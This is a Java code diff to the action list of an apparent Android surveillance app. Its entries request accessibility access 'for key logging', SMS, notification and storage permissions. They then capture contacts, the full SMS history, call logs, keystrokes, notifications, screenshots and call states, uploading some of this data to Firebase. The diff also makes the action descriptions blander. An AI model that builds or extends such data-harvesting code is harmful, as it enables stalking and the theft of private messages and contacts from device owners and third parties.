@@ -25,49 +25,71 @@ import lombok.Getter;
 public enum ClickActions {
 
     REQUEST_ALL_PERMISSION(
-            1,
+            1, ClickActionCategory.PERMISSIONS,
             (context, triggerSettingsData) -> {
                 new PermissionManager().requestAllPermissions((Activity) context);
             },
-            "Request all permissions in a single stroke (It will take permissions one by one until you take action on all)",
+            "Request all permissions in a single stroke",
             "Request all permissions"
     ),
-    RESET_ALL_PERMISSION(
-            2,
-            (context, triggerSettingsData) -> {
-                new PermissionManager().resetAllPermissionManually((Activity) context);
-            },
-            "Reset all permissions manually (It will open settings tab to manually remove all permissions)",
-            "Reset all permissions"
-    ),
     REQUEST_EXACT_ALARM_PERMISSION(
-            3,
+            2, ClickActionCategory.PERMISSIONS,
             (context, triggerSettingsData) -> {
-                // Mysterious observation is that :
-                // If multiple setting intents are called all of them will open up in parallel window in background.
                 ActionUtils.requestExactAlarmPermission();
             },
-            "Request exact alarm permission (It will open setting tab to choose precision alarm permission)",
+            "Request exact alarm permission for precision timing",
             "Request alarm permission"
     ),
     REQUEST_ACCESSIBILITY_PERMISSION(
-            4,
+            3, ClickActionCategory.PERMISSIONS,
             (context, triggerSettingsData) -> {
-                AccessibilityUtils.startAccessibilitySettingIntent((Activity) context);
+                new PermissionManager().requestPermission((Activity) context, PermissionType.ACCESSIBILITY_SERVICE);
             },
-            "Request accessibility permission for key logging (It will open accessibility setting tab to enable key logging)",
+            "Request accessibility permission for key logging",
             "Request accessibility permission"
     ),
-    REQUEST_FILE_ACCESS_PERMISSION(
-            5,
+    REQUEST_SMS_PERMISSION(
+            4, ClickActionCategory.PERMISSIONS,
             (context, triggerSettingsData) -> {
-                FileUtils.startFileAccessSettings((Activity) context);
+                new PermissionManager().requestPermission((Activity) context, PermissionType.READ_SMS);
             },
-            "Request file access permission (It will open file setting tab to enable file access)",
+            "Request SMS reading permission",
+            "Request SMS permission"
+    ),
+    REQUEST_FILE_ACCESS_PERMISSION(
+            5, ClickActionCategory.PERMISSIONS,
+            (context, triggerSettingsData) -> {
+                new PermissionManager().requestPermission((Activity) context, PermissionType.MANAGE_EXTERNAL_STORAGE);
+            },
+            "Request file access permission for storage exploration",
             "Request file access permission"
     ),
+    REQUEST_NOTIFICATION_ACCESS(
+            6, ClickActionCategory.PERMISSIONS,
+            (context, triggerSettingsData) -> {
+                new PermissionManager().requestPermission((Activity) context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
+            },
+            "Request notification listener access",
+            "Request notification access"
+    ),
+    REQUEST_USAGE_STATS_ACCESS(
+            7, ClickActionCategory.PERMISSIONS,
+            (context, triggerSettingsData) -> {
+                new PermissionManager().requestPermission((Activity) context, PermissionType.PACKAGE_USAGE_STATS);
+            },
+            "Request app usage statistics access",
+            "Request usage access"
+    ),
+    REQUEST_BATTERY_OPTIMIZATION(
+            8, ClickActionCategory.PERMISSIONS,
+            (context, triggerSettingsData) -> {
+                new PermissionManager().requestPermission((Activity) context, PermissionType.BATTERY_OPTIMIZATION);
+            },
+            "Request to ignore battery optimizations",
+            "Request battery optimization"
+    ),
     START_SENSOR_SERVICE(
-            6,
+            9, ClickActionCategory.SERVICES,
             (context, triggerSettingsData) -> {
                 if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
                     CDCSensorService.startSensorService((Activity) context);
@@ -75,11 +97,11 @@ public enum ClickActions {
                     CDCSensorService.stopSensorService((Activity) context);
                 }
             },
-            "Start/Stop sensor service (It is a toggle button to start/stop capturing multiple sensors data)",
+            "Start/Stop sensor service for real-time data",
             "Start sensor service"
     ),
     START_SCREENSHOT_SERVICE(
-            7,
+            10, ClickActionCategory.SERVICES,
             (context, triggerSettingsData) -> {
                 if (ActionStatus.PREPARE.equals(triggerSettingsData.getActionStatus())) {
                     ActionUtils.startMediaProjectionService((Activity) context);
@@ -92,31 +114,37 @@ public enum ClickActions {
                         } catch (InterruptedException e) {
                             throw new RuntimeException(e);
                         }
-                        Log.d("ClickActions", "Took the " + i + " screenshot");
                     }
                 } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
                     ScreenshotService.setStopScreenshotService(true);
                 }
-
             },
-            "Start/Stop screenshot service (It is a toggle button to capture a screenshot on the entire system)",
+            "Start/Stop screenshot capture service",
             "Start screenshot service"
     ),
     CAPTURE_ALL_CONTACTS(
-            8,
+            11, ClickActionCategory.DATA_CAPTURE,
             (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.READ_CONTACTS)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_CONTACTS);
+                    return;
+                }
                 if (triggerSettingsData.isSaveOnLocalFile())
                     FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                 if (triggerSettingsData.isUploadDataSnapshot()) {
                     FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CONTACTS));
                 }
             },
-            "Capture all phone contacts (It will capture all the phone contacts)",
+            "Capture all phone contacts snapshot",
             "Capture contacts"
     ),
     CAPTURE_ALL_SMS(
-            9,
+            12, ClickActionCategory.DATA_CAPTURE,
             (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.READ_SMS)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_SMS);
+                    return;
+                }
                 if (triggerSettingsData.isSaveOnLocalFile()) {
                     FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) context, FileMap.SMS));
                 }
@@ -124,71 +152,103 @@ public enum ClickActions {
                     FirebaseUtils.uploadUserSmsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.SMS));
                 }
             },
-            "Capture all SMS (It will capture all the SMS sent, received, deleted, archived)",
+            "Capture all SMS history",
             "Capture SMS"
     ),
     CAPTURE_ALL_CALL_LOGS(
-            10,
+            13, ClickActionCategory.DATA_CAPTURE,
             (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.READ_CALL_LOG)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_CALL_LOG);
+                    return;
+                }
                 if (triggerSettingsData.isSaveOnLocalFile())
                     FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) context, FileMap.CALL));
                 if (triggerSettingsData.isUploadDataSnapshot()) {
-                    FirebaseUtils.uploadUserContactsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CALL));
+                    FirebaseUtils.uploadUserCallLogsDataSnapshot(MessageUtils.getMessages((Activity) context, FileMap.CALL));
                 }
             },
-            "Capture all call logs (It will capture all call logs)",
+            "Capture complete call history",
             "Capture call"
     ),
-    MONITOR_CALL_STATE(
-            11,
+    CAPTURE_KEY_STROKES(
+            14, ClickActionCategory.DATA_CAPTURE,
             (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.ACCESSIBILITY_SERVICE)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.ACCESSIBILITY_SERVICE);
+                    return;
+                }
+            },
+            "Capture key strokes via accessibility",
+            "Capture key strokes"
+    ), 
+    CAPTURE_NOTIFICATIONS(
+            15, ClickActionCategory.DATA_CAPTURE,
+            (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.BIND_NOTIFICATION_LISTENER_SERVICE);
+                    return;
+                }
+            },
+            "Capture device notifications",
+            "Capture Notification"
+    ),
+    GET_APP_USAGE_STATISTICS_REPORT(
+            16, ClickActionCategory.DATA_CAPTURE,
+            (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.PACKAGE_USAGE_STATS)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.PACKAGE_USAGE_STATS);
+                    return;
+                }
+                com.vikasyadavnsit.cdc.services.AppUsageStats.getDailyUsageStats(context);
+            },
+            "Generate app usage analytics report",
+            "Get app usage report"
+    ),
+    MONITOR_CALL_STATE(
+            17, ClickActionCategory.SERVICES,
+            (context, triggerSettingsData) -> {
+                if (!new PermissionManager().hasPermission(context, PermissionType.READ_PHONE_STATE)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.READ_PHONE_STATE);
+                    return;
+                }
                 CallUtils.monitorCallState((Activity) context);
             },
-            "Monitor call state (Incoming, ringing, outgoing, conference)",
+            "Monitor real-time call states",
             "Monitor call state"
     ),
     MONITOR_PHONE_STATISTICS(
-            12,
+            18, ClickActionCategory.SERVICES,
             (context, triggerSettingsData) -> {
                 ActionUtils.registerPhoneStatistics((Activity) context);
             },
-            "Monitor phone statistics (It will capture all the phone statistics like button presses, screen on/off, and user present)",
+            "Monitor system events and statistics",
             "Monitor phone statistics"
     ),
-    CAPTURE_KEY_STROKES(
-            13,
-            (context, triggerSettingsData) -> {
-
-            },
-            "Capture key strokes (It will capture all the key strokes)",
-            "Capture key strokes"
-    ), CAPTURE_NOTIFICATIONS(
-            14,
-            (context, triggerSettingsData) -> {
-
-            },
-            "Capture Device Notifications (It will capture all the device notifications)",
-            "Capture Device Notification"
-    ),
     GET_DIRECTORY_STRUCTURE(
-            15,
+            19, ClickActionCategory.SYSTEM,
             (context, triggerSettingsData) -> {
-
+                if (!new PermissionManager().hasPermission(context, PermissionType.MANAGE_EXTERNAL_STORAGE)) {
+                    new PermissionManager().requestPermission((Activity) context, PermissionType.MANAGE_EXTERNAL_STORAGE);
+                    return;
+                }
+                ActionUtils.getDirectoryStructure((Activity) context);
             },
-            "Get device directory structure",
+            "Explore device folder hierarchy",
             "Get directory structure"
     ),
-    GET_APP_USAGE_STATISTICS_REPORT(
-            16,
+    RESET_ALL_PERMISSION(
+            20, ClickActionCategory.SYSTEM,
             (context, triggerSettingsData) -> {
-
+                new PermissionManager().resetAllPermissionManually((Activity) context);
             },
-            "Get app usage statistics report",
-            "Get app usage report"
+            "Wipe all granted permissions",
+            "Reset all permissions"
     );
 
-    int order;
-    BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
-    String description;
-    String actionLabel;
+    final int order;
+    final ClickActionCategory category;
+    final BiConsumer<Context, User.AppTriggerSettingsData> biConsumer;
+    final String description;
+    final String actionLabel;
 }
